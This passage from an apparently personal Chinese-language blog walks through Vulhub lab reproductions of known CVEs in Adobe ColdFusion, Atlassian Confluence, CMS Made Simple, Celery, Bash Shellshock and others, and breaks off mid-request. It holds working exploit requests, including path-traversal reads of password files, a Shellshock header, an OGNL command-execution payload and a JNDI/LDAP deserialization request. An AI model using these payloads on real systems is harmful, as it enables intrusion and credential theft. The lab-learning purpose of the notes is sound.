class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为<code>admin</code>。</p><p>构造头<code>Authorization: Digest username=admin</code>，并发送如下数据包：</p><pre class="line-numbers language-none"><code class="language-none">GET / HTTP/1.1Host: example.comAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeAuthorization: Digest username=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/37.jpg" alt="37"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/38.jpg" alt="38"></p><blockquote><p>设置这个session到浏览器，即可正常访问需要认证的页面：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/39.jpg" alt="39"></p><h1 id="Aria2-任意文件写入漏洞-（未完成）"><a href="#Aria2-任意文件写入漏洞-（未完成）" class="headerlink" title="Aria2 任意文件写入漏洞 （未完成）"></a>Aria2 任意文件写入漏洞 （未完成）</h1><blockquote><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p><p>参考文章：[<a href="https://paper.seebug.org/120/][1]">https://paper.seebug.org/120/][1]</a></p></blockquote><h2 id="漏洞复现-13"><a href="#漏洞复现-13" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a href="http://binux.github.io/yaaw/demo/">http://binux.github.io/yaaw/demo/</a> 。</p><p>打开yaaw，点击配置按钮，填入运行aria2的目标域名：<code>http://your-ip:6800/jsonrpc</code></p></blockquote><p>这个多半需要公网环境… 回去再搞</p><h1 id="Bash-Shellshock-破壳漏洞（CVE-2014-6271）（未完成）"><a href="#Bash-Shellshock-破壳漏洞（CVE-2014-6271）（未完成）" class="headerlink" title="Bash Shellshock 破壳漏洞（CVE-2014-6271）（未完成）"></a>Bash Shellshock 破壳漏洞（CVE-2014-6271）（未完成）</h1><blockquote><p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p><p>将payload附在User-Agent中访问victim.cgi：</p><pre class="line-numbers language-none"><code class="language-none">User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令成功被执行：</p></blockquote><p>不知道为啥就是没有正常回显…</p><h1 id="Cacti-前台命令注入漏洞（CVE-2022-46169）-未完成"><a href="#Cacti-前台命令注入漏洞（CVE-2022-46169）-未完成" class="headerlink" title="Cacti 前台命令注入漏洞（CVE-2022-46169）(未完成)"></a>Cacti 前台命令注入漏洞（CVE-2022-46169）(未完成)</h1><blockquote><p>Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf">https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf</a></li><li><a href="https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A">https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A</a></li></ul></blockquote><p>8080端口的容器一开就死 跳了</p><h1 id="Celery"><a href="#Celery" class="headerlink" title="Celery <4.0 Redis未授权访问+Pickle反序列化利用"></a>Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用</h1><blockquote><p>Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p><p>在Celery &lt; 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。</p></blockquote><h2 id="漏洞复现-14"><a href="#漏洞复现-14" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>漏洞利用脚本<code>exploit.py</code>仅支持在python3下使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip install redispython exploit.py [主机IP]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看结果：</p><pre class="line-numbers language-none"><code class="language-none">docker compose logs celery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/40.jpg" alt="40"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/41.jpg" alt="41"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/42.jpg" alt="42"></p><h1 id="CGI-HTTPoxy漏洞（CVE-2016-5385）（未完成）"><a href="#CGI-HTTPoxy漏洞（CVE-2016-5385）（未完成）" class="headerlink" title="CGI HTTPoxy漏洞（CVE-2016-5385）（未完成）"></a>CGI HTTPoxy漏洞（CVE-2016-5385）（未完成）</h1><blockquote><p>根据RFC 3875规定，CGI（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p><p>PHP5.6.24版本修复了该漏洞，不会再将<code>Proxy</code>放入环境变量中。本环境使用PHP 5.6.23为例。</p><p>当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。CVE-2016-5385是PHP的CVE，HTTPoxy所有的CVE编号如下：</p><ul><li>CVE-2016-5385: PHP</li><li>CVE-2016-5386: Go</li><li>CVE-2016-5387: Apache HTTP Server</li><li>CVE-2016-5388: Apache Tomcat</li><li>CVE-2016-6286: spiffy-cgi-handlers for CHICKEN</li><li>CVE-2016-6287: CHICKEN’s http-client</li><li>CVE-2016-1000104: mod_fcgi</li><li>CVE-2016-1000105: Nginx cgi script</li><li>CVE-2016-1000107: Erlang inets</li><li>CVE-2016-1000108: YAWS</li><li>CVE-2016-1000109: HHVM FastCGI</li><li>CVE-2016-1000110: Python CGIHandler</li><li>CVE-2016-1000111: Python Twisted</li><li>CVE-2016-1000212: lighttpd</li></ul><p>参考链接：</p><ul><li><a href="https://httpoxy.org/aaaaahttp://www.laruence.com/2016/07/19/3101.html">https://httpoxy.org/aaaaahttp://www.laruence.com/2016/07/19/3101.html</a></li></ul></blockquote><h1 id="CMS-Made-Simple-CMSMS-2-2-10-前台SQL注入漏洞（CVE-2019-9053）"><a href="#CMS-Made-Simple-CMSMS-2-2-10-前台SQL注入漏洞（CVE-2019-9053）" class="headerlink" title="CMS Made Simple (CMSMS) < 2.2.10 前台SQL注入漏洞（CVE-2019-9053）"></a>CMS Made Simple (CMSMS) &lt; 2.2.10 前台SQL注入漏洞（CVE-2019-9053）</h1><blockquote><p>CMS Made Simple（CMSMS）是一个免费的开放源码内容管理系统，为开发人员、程序员和网站所有者提供基于网络的开发和管理功能。</p><p>在 2.2.9.1 之前的版本中，CMS Made Simple 存在一个未验证的 SQL 注入漏洞，攻击者可利用该漏洞获取管理员密码或密码重置令牌。结合后台的 SSTI 漏洞（<a href="https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2021-26120">CVE-2021-26120</a>），攻击者可在目标服务器上执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li><li><a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a></li></ul></blockquote><h2 id="漏洞复现-15"><a href="#漏洞复现-15" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先是配置<br>环境环境启动后，你需要访问<code>http://your-ip/install.php</code>并安装CMS服务。<br>安装过程请根据页面中的安装向导来进行，其中MySQL数据库的地址是<code>db</code>，数据库名是<code>cmsms</code>，账号和密码均为<code>root</code>。</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/43.jpg" alt="43"></p><blockquote><p>使用<a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a>中的脚本来利用SQL注入漏洞：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">python2 poc.py -u http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:kali自带python2 3 但是3运行该py会报错 2又缺一些组件 pip2又不自带 安装很是麻烦<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/44.jpg" alt="44"><br>等他程序自己把密码爆出来就完事了</p><h1 id="CMS-Made-Simple-CMSMS-前台代码执行漏洞（CVE-2021-26120）"><a href="#CMS-Made-Simple-CMSMS-前台代码执行漏洞（CVE-2021-26120）" class="headerlink" title="CMS Made Simple (CMSMS) 前台代码执行漏洞（CVE-2021-26120）"></a>CMS Made Simple (CMSMS) 前台代码执行漏洞（CVE-2021-26120）</h1><blockquote><p>CMS Made Simple（CMSMS）是一个免费的开放源码内容管理系统，为开发人员、程序员和网站所有者提供基于网络的开发和管理功能。</p><p>Smarty 3.1.39 之前的版本允许在 <code>{function name=</code> 子串后注入PHP代码，导致代码注入漏洞，该漏洞即为CVE-2021-26120。</p><p>CMS Made Simple 版本 &lt;= 2.2.15，拥有设计师权限的用户可以在后台利用服务端模板注入漏洞，即为前面提到的CVE-2021-26120。</p><p>因此，如果CMSMS版本低于2.2.9.1，未授权的攻击者可以结合<a href="https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2019-9053">CVE-2019-9053</a>和CVE-2021-26120漏洞，在服务器上执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li><li><a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a></li></ul></blockquote><h2 id="漏洞复现-16"><a href="#漏洞复现-16" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先是配置<br>环境环境启动后，你需要访问<code>http://your-ip/install.php</code>并安装CMS服务。<br>安装过程请根据页面中的安装向导来进行，其中MySQL数据库的地址是<code>db</code>，数据库名是<code>cmsms</code>，账号和密码均为<code>root</code>。</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/43.jpg" alt="43"></p><blockquote><p>使用<a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a>中分享的<a href="poc.py">POC</a>，可以使用SQL注入漏洞重置管理员密码，并执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">python poc.py 127.0.0.1 / id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/45.jpg" alt="45"></p><p>可见，<code>id</code>命令已被成功执行。</p><h1 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p></blockquote><h2 id="漏洞复现-17"><a href="#漏洞复现-17" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>直接访问<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>，即可读取文件<code>/etc/passwd</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/46.jpg" alt="46"></p><blockquote><p>读取后台管理员密码<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/47.jpg" alt="47"></p><h1 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p><p>参考链接：</p><ul><li><a href="https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></li><li><a href="https://www.exploit-db.com/exploits/43993">https://www.exploit-db.com/exploits/43993</a></li><li><a href="https://github.com/codewhitesec/ColdFusionPwn">https://github.com/codewhitesec/ColdFusionPwn</a></li></ul></blockquote><h2 id="漏洞复现-18"><a href="#漏洞复现-18" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们使用参考链接中的<a href="https://github.com/codewhitesec/ColdFusionPwn">ColdFusionPwn</a>工具来生成POC：</p><pre class="line-numbers language-none"><code class="language-none">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POC生成于poc.ser文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，Content-Type为application/x-amf：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/48.jpg" alt="48"><br>这里burp用的是“粘贴文件至”来发送的数据包 不然容易出现错误<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/49.jpg" alt="49"><br>一般来说正常返回完文件也会被正常创建 但多半是ysoserial版本不对 没有正常创建</p><blockquote><p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p><p>将POC改成<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">反弹命令</a>，成功拿到shell：</p></blockquote><h1 id="Adobe-ColdFusion-本地文件包含漏洞（CVE-2023-26360）"><a href="#Adobe-ColdFusion-本地文件包含漏洞（CVE-2023-26360）" class="headerlink" title="Adobe ColdFusion 本地文件包含漏洞（CVE-2023-26360）"></a>Adobe ColdFusion 本地文件包含漏洞（CVE-2023-26360）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion 2018 Update 15 和 2021 Update 5 版本及以前，存在一处文件包含漏洞。攻击者可以利用该漏洞在服务器上执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://xz.aliyun.com/t/13392">https://xz.aliyun.com/t/13392</a></li></ul></blockquote><h2 id="漏洞复现-19"><a href="#漏洞复现-19" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>发送如下请求即可读取文件<code>/proc/self/environ</code>：</p><pre class="line-numbers language-none"><code class="language-none">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1Host: localhost:8500Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 82Content-Type: application/x-www-form-urlencoded_variables={"_metadata":{"classname":"../../../../../../../../proc/self/environ"}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你可以在返回包中找到Adobe ColdFusion的根目录<code>/opt/coldfusion/cfusion</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/50.jpg" alt="50"></p><blockquote><p>从<code>../../../../../../../../opt/coldfusion/cfusion/lib/password.properties</code>中读取服务器密码：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/51.jpg" alt="51"></p><blockquote><p>想要利用文件包含漏洞执行任意代码，需要先发送如下请求来写入CFM脚本：</p><pre class="line-numbers language-none"><code class="language-none">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1Host: localhost:8500Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 67Content-Type: application/x-www-form-urlencoded_variables=&lt;cfexecute name='id' outputFile='/tmp/success' &gt;&lt;/cfexecute&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后包含日志文件，执行该CFM代码：</p><pre class="line-numbers language-none"><code class="language-none">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1Host: localhost:8500Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 111Content-Type: application/x-www-form-urlencoded_variables={"_metadata":{"classname":"../../../../../../../../opt/coldfusion/cfusion/logs/coldfusion-out.log"}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，<code>id</code>命令的执行结果已经被写入<code>/tmp/success</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/52.jpg" alt="52"></p><h1 id="Adobe-ColdFusion-XML-反序列化命令执行漏洞（CVE-2023-29300）"><a href="#Adobe-ColdFusion-XML-反序列化命令执行漏洞（CVE-2023-29300）" class="headerlink" title="Adobe ColdFusion XML 反序列化命令执行漏洞（CVE-2023-29300）"></a>Adobe ColdFusion XML 反序列化命令执行漏洞（CVE-2023-29300）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion在2018.0.16、2021.0.6、2023.0.0.330468版本及以前，存在一处XML反序列化漏洞。攻击者可以利用该漏洞调用Java中任意setter方法，最终执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://blog.projectdiscovery.io/adobe-coldfusion-rce/">https://blog.projectdiscovery.io/adobe-coldfusion-rce/</a></li><li><a href="https://xz.aliyun.com/t/13413">https://xz.aliyun.com/t/13413</a></li></ul></blockquote><h2 id="漏洞复现-20"><a href="#漏洞复现-20" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>要利用这个漏洞，需要先找到一个可利用的setter方法作为Gadget。最常见的Gadget是利用<code>com.sun.rowset.JdbcRowSetImpl</code>来进行JNDI注入，并执行任意命令。</p><p>首先，启动一个恶意JNDI服务器，并加载<code>CommonsBeanutils1</code>作为内层反序列化Gadget。Github上有数个工具可以使用，比如<a href="https://github.com/rebeyond/JNDInjector/releases">https://github.com/rebeyond/JNDInjector/releases</a>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/53.jpg" alt="53"></p><blockquote><p>然后，将恶意LDAP地址替换到如下请求中发送：</p><pre class="line-numbers language-none"><code class="language-none">POST /CFIDE/adminapi/accessmanager.cfc?method=foo&amp;_cfclient=true HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 333argumentCollection=&lt;wddxPacket version='1.0'&gt;&lt;header/&gt;&lt;data&gt;&lt;struct type='xcom.sun.rowset.JdbcRowSetImplx'&gt;&lt;var name='dataSourceName'&gt;&lt;string&gt;ldap://192.168.0.196/PJlkCbYLJV/CommonsBeanutils1/Exec/eyJjbWQiOiJ0b3VjaCAvdG1wL3dvd3dlZGlkaXQifQ==&lt;/string&gt;&lt;/var&gt;&lt;var name='autoCommit'&gt;&lt;boolean value='true'/&gt;&lt;/var&gt;&lt;/struct&gt;&lt;/data&gt;&lt;/wddxPacket&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>localhost处改端口似乎是必要的 改完就成功复现了</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/54.jpg" alt="54"></p><blockquote><p>可见，<code>touch /tmp/success</code>已被成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/55.jpg" alt="55"></p><h1 id="Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）"><a href="#Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）" class="headerlink" title="Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）"></a>Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。</p><p>参考资料：</p><ul><li><a href="https://paper.seebug.org/884/">https://paper.seebug.org/884/</a></li><li><a href="https://jira.atlassian.com/browse/CONFSERVER-57974">https://jira.atlassian.com/browse/CONFSERVER-57974</a></li></ul></blockquote><h2 id="漏洞复现-21"><a href="#漏洞复现-21" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>环境启动后，访问<code>http://your-ip:8090</code>会进入安装引导，选择“Trial installation”，之后会要求填写license key。点击“Get an evaluation license”，去Atlassian官方申请一个Confluence Server的测试证书：</p><p>然后点击Next安装即可。这一步小内存VPS可能安装失败或时间较长（建议使用4G内存以上的机器进行安装与测试），请耐心等待。</p><p>如果提示填写cluster node，路径填写<code>/home/confluence</code>即可：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/56.jpg" alt="56"></p><blockquote><p>发送如下数据包，即可读取文件<code>web.xml</code>：</p><pre class="line-numbers language-none"><code class="language-none">POST /rest/tinymce/1/macro/preview HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeReferer: http://localhost:8090/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;Content-Type: application/json; charset=utf-8Content-Length: 176{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/57.jpg" alt="57"></p><h1 id="Atlassian-Confluence-OGNL表达式注入命令执行漏洞（CVE-2021-26084）"><a href="#Atlassian-Confluence-OGNL表达式注入命令执行漏洞（CVE-2021-26084）" class="headerlink" title="Atlassian Confluence OGNL表达式注入命令执行漏洞（CVE-2021-26084）"></a>Atlassian Confluence OGNL表达式注入命令执行漏洞（CVE-2021-26084）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统，其部分版本中存在OGNL表达式注入漏洞。攻击者可以通过这个漏洞，无需任何用户的情况下在目标Confluence中执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html">https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html</a></li><li><a href="https://jira.atlassian.com/browse/CONFSERVER-67940">https://jira.atlassian.com/browse/CONFSERVER-67940</a></li><li><a href="https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md">https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</a></li><li><a href="https://github.com/h3v0x/CVE-2021-26084_Confluence">https://github.com/h3v0x/CVE-2021-26084_Confluence</a></li></ul></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p>有多个接口可以触发这个OGNL表达式注入漏洞。</p><h3 id="pages-doenterpagevariables-action"><a href="#pages-doenterpagevariables-action" class="headerlink" title="/pages/doenterpagevariables.action"></a>/pages/doenterpagevariables.action</h3><p>这个接口不需要登录即可利用，发送如下数据包，即可看到<code>233*233</code>已被执行：</p><pre class="line-numbers language-none"><code class="language-none">POST /pages/doenterpagevariables.action HTTP/1.1Host: your-ip:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 47queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/58.jpg" alt="58"></p><blockquote><p>执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/59.jpg" alt="59"></p><blockquote><h3 id="pages-createpage-entervariables-action"><a href="#pages-createpage-entervariables-action" class="headerlink" title="/pages/createpage-entervariables.action"></a>/pages/createpage-entervariables.action</h3><p>这个路径也不需要用户登录：</p><pre class="line-numbers language-none"><code class="language-none">POST /pages/createpage-entervariables.action HTTP/1.1Host: your-ip:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 47queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pages-createpage-action"><a href="#pages-createpage-action" class="headerlink" title="/pages/createpage.action"></a>/pages/createpage.action</h3><p>这个接口需要一个可以创建页面的用户权限：</p><pre class="line-numbers language-none"><code class="language-none">GET /pages/createpage.action?spaceKey=EX&amp;src=quick-create&amp;queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027 HTTP/1.1Host: 192.168.1.162:8090Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; 